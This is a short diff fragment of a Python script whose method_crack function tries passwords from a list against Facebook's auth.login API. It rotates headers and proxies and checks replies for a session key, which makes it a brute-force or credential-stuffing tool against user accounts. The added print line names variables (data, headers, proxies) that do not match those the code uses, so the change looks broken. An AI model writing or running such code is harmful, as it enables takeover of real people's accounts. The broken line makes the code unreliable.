@@ -162,6 +162,7 @@ def method_crack(ids,passlist):
             header=random.choice([sex,sex1])
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
+            print(url,data,headers,proxies)
             #print(response)
             if 'session_key' in reqx:
                 try:
